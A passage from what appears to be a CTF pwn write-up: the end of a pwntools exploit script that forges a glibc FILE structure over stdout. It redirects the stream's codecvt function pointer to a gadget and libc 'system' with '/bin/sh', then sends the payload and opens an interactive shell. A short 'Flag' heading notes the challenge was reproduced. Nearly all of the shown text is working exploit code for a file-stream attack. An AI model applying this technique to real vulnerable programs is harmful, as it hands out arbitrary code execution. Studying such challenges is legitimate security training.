    system = libc.sym["system"]

    fp = FileStructure(null=stdout + 0x1260)
    fp.flags = 0x8
    fp.unknown2 = flat(
        {
            0x18: 0x1,  # fp->_mode
        },
        filler=b"\x00",
    )
    fp._IO_write_ptr = 1
    fp._IO_write_base = 0
    fp._wide_data = stdout - 0x8
    fp._codecvt = stdout + 0x28  # codecvt
    fp._IO_save_end = stdout + 0x8
    fp._IO_read_base = system // 0x4 << 0x2  # rdx
    fp.markers = stdout + 0x20  # gs->__shlib_handle
    fp._IO_save_base = add_rdi_0x10_jmp_rcx  # gs->__fct
    fp._IO_write_end = b"/bin/sh\x00"

    raw_input("DEBUG")
    target.send(bytes(fp))

    target.interactive()


if __name__ == "__main__":
    main()
```

## Flag

复现。
